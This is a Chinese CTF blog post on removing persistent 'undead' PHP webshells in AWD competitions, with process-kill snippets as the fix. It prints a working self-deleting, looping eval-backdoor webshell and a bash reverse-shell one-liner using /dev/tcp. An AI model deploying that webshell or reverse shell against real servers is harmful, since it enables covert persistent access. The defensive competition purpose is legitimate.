---
title: 干掉 PHP 不死马
date: 2019-04-04 23:20:56
tags: [awd, web]
---

在 AWD 模式下经常碰到不死马, 不干掉的话就会一直被偷 flag, 很难受. 所以研究一下怎么干掉.  

<!--more-->

## 什么是不死马

先说一下什么是不死马, 比如这种  

```php
<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
while (1) {
    $content = "<?php error_reporting(0);if(sha1(\$_POST['pwd'])==='%pwd%'){eval(\$_POST['cmd']);}?>";
    file_put_contents(".shell.php", $content);
    usleep(10000);
}
?>
```

简单来说有以下特性:  
* 访问后删除自己
* 即使断开连接也不会停止
* 驻留在内存中定时做某些事情, 比如上面这种就是不停的写 webshell

根据行为也可以将不死马分为两种, 一种是 while(1) 不 sleep, 占用服务器资源, 卡机子,  还有一种是 sleep, 悄悄的留后门  
如果不懂怎么干掉的话, 唯一的办法就是重启环境了, 而这在 AWD 中一般都是会倒扣不少分的...  

接下来了解一下 php 主流的两种运行模式 `php-fpm` 与 `php-apache` 这两种,  
`php-fpm` 适用于 `nginx` 和 `apache` 而 `php-apache` 自然是只能 `apache` 使用,  
其中 fpm 的性能更好, 但是配置较为复杂(其实也不是很复杂 233),  在 AWD 我只遇见过 `php-apache` 这种 0.0  
但是其实要干掉不死马, 步骤都差不多  

## 干掉不死马
### php-apache
在这种模式下, 会在 fork 的一个 apache 进程里面以低权限用户来处理 php, 如下图  
![](https://i.loli.net/2019/04/04/5ca626d682f9d.png#center)  
我们只要杀掉所以这些进程就行, 但在 AWD 中一般是没 root 权限的, 我们要干掉这些只能以低权限的身份来. 这里有两种办法  
1. 给自己在 web 目录下写一个 php, 里面是 
```php
<?php
system("kill `ps -ef | grep httpd | grep -v grep | awk '{print $2}'`");
```
如果觉得碰到不死马了就直接访问, 杀掉所有 httpd 进程, 因为权限不够, root 的不会被杀掉, 这个守护进程会自动再 fork 进程, 不用担心服务挂  

2. 写个 php 给自己弹个 shell, 在 shell 里面 killall, 这个更方便一点, 也更灵活
```php
<?php
system("bash -i >& /dev/tcp/127.0.0.1/23333 0>&1");
```

### php-fpm
其实跟上面差不多, 只是进程名不同, 因为 fpm 是独立的服务, 不同于上面 apache 里面直接调用 php 的 api  
![](https://i.loli.net/2019/04/05/5ca62d252ca42.png#center)  
```php
<?php
system("kill `ps -ef | grep php-fpm | grep -v grep | awk '{print $2}'`");
```